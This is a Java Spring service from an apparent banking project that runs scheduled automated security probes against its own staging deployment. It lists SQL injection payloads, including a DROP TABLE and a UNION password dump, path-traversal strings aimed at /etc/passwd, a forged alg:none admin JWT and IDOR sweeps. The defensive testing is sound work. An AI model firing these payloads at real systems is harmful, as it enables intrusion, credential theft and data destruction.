package com.titan.titancorebanking.security.redteam;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Service;
import org.springframework.web.reactive.function.client.WebClient;

import java.time.Duration;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;

@Service
@RequiredArgsConstructor
@Slf4j
public class CartRedTeamService {

    private final WebClient.Builder webClientBuilder;

    @Value("${cart.target.base-url:http://titan-core-banking:8080}")
    private String targetBaseUrl;

    @Value("${spring.profiles.active:dev}")
    private String activeProfile;

    // STAFF ENGINEER FIX: Thread-safe list for findings
    private final List<SecurityFinding> findings = new CopyOnWriteArrayList<>();

    private static final Duration PROBE_TIMEOUT = Duration.ofSeconds(2);

    @Scheduled(cron = "0 0 1 * * *")
    public void runNightlyRedTeam() {
        if (!activeProfile.contains("staging")) {
            log.debug("CART: Skipping - only runs in staging profile.");
            return;
        }

        findings.clear();
        log.info("CART: Starting nightly red team run against {}", targetBaseUrl);

        probeSqlInjection();
        probeJwtForgery();
        probePathTraversal();
        probeIdorAccess();
        probeGrpcReflection();

        log.info("CART: Run complete. {} findings.", findings.size());
    }

    @Scheduled(cron = "0 0 6 * * *")
    public void generateDailyReport() {
        if (!activeProfile.contains("staging") || findings.isEmpty()) return;

        StringBuilder report = new StringBuilder();
        report.append("=== TITAN CART SECURITY REPORT ===\n");
        report.append("Date: ").append(LocalDate.now()).append("\n");
        report.append("Target: ").append(targetBaseUrl).append("\n");
        report.append("Total Findings: ").append(findings.size()).append("\n\n");

        long critical = findings.stream().filter(f -> f.severity() == Severity.CRITICAL).count();
        long high = findings.stream().filter(f -> f.severity() == Severity.HIGH).count();
        long medium = findings.stream().filter(f -> f.severity() == Severity.MEDIUM).count();

        report.append(String.format("CRITICAL: %d | HIGH: %d | MEDIUM: %d\n\n", critical, high, medium));

        findings.forEach(f -> report.append(String.format("[%s] %s\n  Endpoint: %s\n  Payload: %s\n  Response: %s\n\n",
                f.severity(), f.title(), f.endpoint(), f.payload(), f.responseCode())));

        log.warn("\n{}", report);
    }

    private void probeSqlInjection() {
        List<String> payloads = List.of(
                "' OR '1'='1",
                "'; DROP TABLE transactions; --",
                "1 UNION SELECT username, password FROM users--",
                "' OR 1=1--"
        );
        List<String> endpoints = List.of(
                "/api/v1/users?username=",
                "/api/v1/accounts?accountNumber=",
                "/api/v1/transactions?id="
        );

        for (String endpoint : endpoints) {
            for (String payload : payloads) {
                try {
                    var response = webClientBuilder.baseUrl(targetBaseUrl).build()
                            .get()
                            .uri(endpoint + payload)
                            .header("Authorization", "Bearer invalid-token")
                            .retrieve()
                            .toBodilessEntity()
                            .timeout(PROBE_TIMEOUT) // STAFF ENGINEER FIX
                            .block();

                    int status = response != null ? response.getStatusCode().value() : 0;
                    if (status == 200) {
                        findings.add(new SecurityFinding(
                                Severity.CRITICAL, "Potential SQL Injection",
                                endpoint, payload, String.valueOf(status),
                                LocalDateTime.now()
                        ));
                    }
                } catch (Exception ignored) {}
            }
        }
    }

    private void probeJwtForgery() {
        String forgedHeader = java.util.Base64.getUrlEncoder().withoutPadding()
                .encodeToString("{\"alg\":\"none\",\"typ\":\"JWT\"}".getBytes());
        String forgedPayload = java.util.Base64.getUrlEncoder().withoutPadding()
                .encodeToString("{\"sub\":\"admin\",\"roles\":[\"ADMIN\"],\"exp\":9999999999}".getBytes());
        String forgedToken = forgedHeader + "." + forgedPayload + ".";

        try {
            var response = webClientBuilder.baseUrl(targetBaseUrl).build()
                    .get()
                    .uri("/api/v1/admin/users")
                    .header("Authorization", "Bearer " + forgedToken)
                    .retrieve()
                    .toBodilessEntity()
                    .timeout(PROBE_TIMEOUT)
                    .block();

            int status = response != null ? response.getStatusCode().value() : 0;
            if (status == 200) {
                findings.add(new SecurityFinding(
                        Severity.CRITICAL, "JWT alg:none Attack Succeeded",
                        "/api/v1/admin/users", "alg:none forged token", String.valueOf(status),
                        LocalDateTime.now()
                ));
            }
        } catch (Exception ignored) {}
    }

    private void probePathTraversal() {
        List<String> payloads = List.of(
                "../../../../etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd"
        );

        for (String payload : payloads) {
            try {
                var response = webClientBuilder.baseUrl(targetBaseUrl).build()
                        .get()
                        .uri("/api/v1/files/" + payload)
                        .retrieve()
                        .bodyToMono(String.class)
                        .timeout(PROBE_TIMEOUT)
                        .block();

                if (response != null && response.contains("root:")) {
                    findings.add(new SecurityFinding(
                            Severity.CRITICAL, "Path Traversal - /etc/passwd exposed",
                            "/api/v1/files/", payload, "200", LocalDateTime.now()
                    ));
                }
            } catch (Exception ignored) {}
        }
    }

    private void probeIdorAccess() {
        String lowPrivToken = generateLowPrivToken();
        for (int id = 1; id <= 5; id++) {
            try {
                var response = webClientBuilder.baseUrl(targetBaseUrl).build()
                        .get()
                        .uri("/api/v1/accounts/" + id)
                        .header("Authorization", "Bearer " + lowPrivToken)
                        .retrieve()
                        .toBodilessEntity()
                        .timeout(PROBE_TIMEOUT)
                        .block();

                int status = response != null ? response.getStatusCode().value() : 0;
                if (status == 200) {
                    findings.add(new SecurityFinding(
                            Severity.HIGH, "Potential IDOR on account endpoint",
                            "/api/v1/accounts/" + id, "low-priv token", String.valueOf(status),
                            LocalDateTime.now()
                    ));
                }
            } catch (Exception ignored) {}
        }
    }

    private void probeGrpcReflection() {
        try {
            var response = webClientBuilder.baseUrl(targetBaseUrl.replace("8080", "50051")).build()
                    .get()
                    .uri("/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo")
                    .retrieve()
                    .toBodilessEntity()
                    .timeout(PROBE_TIMEOUT)
                    .block();

            int status = response != null ? response.getStatusCode().value() : 0;
            if (status != 404 && status != 0) {
                findings.add(new SecurityFinding(
                        Severity.MEDIUM, "gRPC Reflection exposed",
                        "grpc:50051", "reflection probe", String.valueOf(status),
                        LocalDateTime.now()
                ));
            }
        } catch (Exception ignored) {}
    }

    private String generateLowPrivToken() {
        String header = java.util.Base64.getUrlEncoder().withoutPadding()
                .encodeToString("{\"alg\":\"HS256\",\"typ\":\"JWT\"}".getBytes());
        String payload = java.util.Base64.getUrlEncoder().withoutPadding()
                .encodeToString("{\"sub\":\"cart-test-user\",\"roles\":[\"USER\"]}".getBytes());
        return header + "." + payload + ".cart-test-signature";
    }

    public record SecurityFinding(
            Severity severity, String title, String endpoint,
            String payload, String responseCode, LocalDateTime detectedAt
    ) {}

    public enum Severity { CRITICAL, HIGH, MEDIUM, LOW, INFO }

    public List<SecurityFinding> getFindings() { return List.copyOf(findings); }
}